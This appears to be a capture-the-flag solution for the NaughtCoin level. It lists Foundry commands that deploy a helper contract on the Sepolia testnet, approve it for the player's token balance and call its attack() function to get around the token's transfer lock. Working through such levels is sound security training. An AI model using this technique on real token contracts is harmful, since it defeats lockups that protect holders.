# NaughtCoin Solution

1) Deploy `NaughtCoinHack`:

```
forge create NaughtCoinHack --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```

2) Retrieve the `balance`:

```
cast call `instanceAddress` "balanceOf(address)" `sepoliaPublicKey` --rpc-url $SEPOLIA_RPC_URL
cast to-dec `balanceHex`
```

3) Call `approve()`:

```
cast send `instanceAddress` "approve(address, uint256)" `naughtCoinHackAddress` `balance` --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```

4) Call `attack()`:

```
cast send `naughtCoinHackAddress` "attack(address)" `ìnstanceAddress` --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```
